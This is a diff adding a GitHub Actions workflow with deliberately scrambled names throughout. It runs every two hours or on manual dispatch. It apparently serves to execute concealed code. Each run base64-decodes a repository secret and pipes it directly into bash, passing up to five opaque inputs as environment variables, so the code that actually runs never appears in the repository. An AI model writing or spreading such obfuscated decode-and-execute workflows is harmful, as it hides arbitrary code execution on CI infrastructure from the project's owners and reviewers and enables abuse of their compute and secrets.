@@ -1,0 +1,33 @@
+name: JAjMiMfTiH
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+    inputs:
+      ykRHtAZ:
+        required: false
+      iaqRrBgBH:
+        required: false
+      JikxHw:
+        required: false
+      VRymSX:
+        required: false
+      dOvLJP:
+        required: false
+jobs:
+  GOJMvNv:
+    runs-on: ubuntu-24.04
+    env:
+      NcZxhdw: ${{ secrets.smsnIsLL }}
+    steps:
+      - uses: actions/checkout@v5
+      - if: github.event.inputs.ykRHtAZ == ''
+        run: echo "${{ secrets.iiVjvgoD }}" | base64 -d | bash
+      - if: github.event.inputs.ykRHtAZ != ''
+        run: echo "${{ secrets.XOvBis }}" | base64 -d | bash
+        env:
+          wGKsBJMtavi: ${{ github.event.inputs.ykRHtAZ }}
+          tjzmEiOZv: ${{ github.event.inputs.iaqRrBgBH }}
+          SzLjYFb: ${{ github.event.inputs.JikxHw }}
+          NuiqJwKLxuh: ${{ github.event.inputs.VRymSX }}
+          WGEqcxT: ${{ github.event.inputs.dOvLJP }}
